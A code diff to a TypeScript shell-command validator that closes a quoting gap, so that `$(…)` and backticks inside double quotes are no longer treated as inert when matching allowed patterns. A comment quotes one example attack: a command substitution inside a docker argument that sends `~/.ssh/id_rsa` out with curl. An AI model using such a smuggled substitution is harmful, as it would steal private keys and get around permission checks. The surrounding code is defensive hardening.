@@ -49,7 +49,12 @@ export function validatePattern(pattern: string): { valid: boolean; error?: stri
 //
 // So: replace metacharacters that sit INSIDE a quoted span with a placeholder the wildcard
 // accepts, and leave unquoted ones exactly as they were, so chaining is still refused.
+//
+// Double quotes are NOT fully inert: bash still runs `$(…)`, backticks and `${…}` expansion
+// inside them, so `docker run x "$(curl -d @~/.ssh/id_rsa …)"` would otherwise match `docker *`.
+// `$` and backtick therefore stay live inside double quotes; only single quotes mask them.
 const MASK = '\x01'
+const LIVE_IN_DOUBLE = '$`'
 
 /** Replace in-quote metacharacters with MASK. Returns the input unchanged if a quote is
  *  left open — a dangling quote must never make the rest of the line look inert. */
@@ -61,14 +66,17 @@ function maskQuoted(s: string): string {
     // Backslash escapes the next character, but NOT inside single quotes, where POSIX
     // treats it literally. Copy both through so the span accounting stays honest.
     if (c === '\\' && quote !== '\'' && i + 1 < s.length) {
-      out.push(c, s[i + 1]!)
+      // Inside double quotes an escaped character is literal (`"\$(x)"` runs nothing).
+      const next = s[i + 1]!
+      out.push(c, quote === '"' && META.includes(next) ? MASK : next)
       i++
       continue
     }
     if (quote) {
       if (c === quote) { quote = null; out.push(c); continue }
-      // Inert: inside quotes this character is an argument, not shell syntax.
-      out.push(META.includes(c) ? MASK : c)
+      // Inert: inside quotes this character is an argument, not shell syntax — except
+      // expansion, which double quotes still perform.
+      out.push(META.includes(c) && !(quote === '"' && LIVE_IN_DOUBLE.includes(c)) ? MASK : c)
       continue
     }
     if (c === '"' || c === '\'') { quote = c; out.push(c); continue }
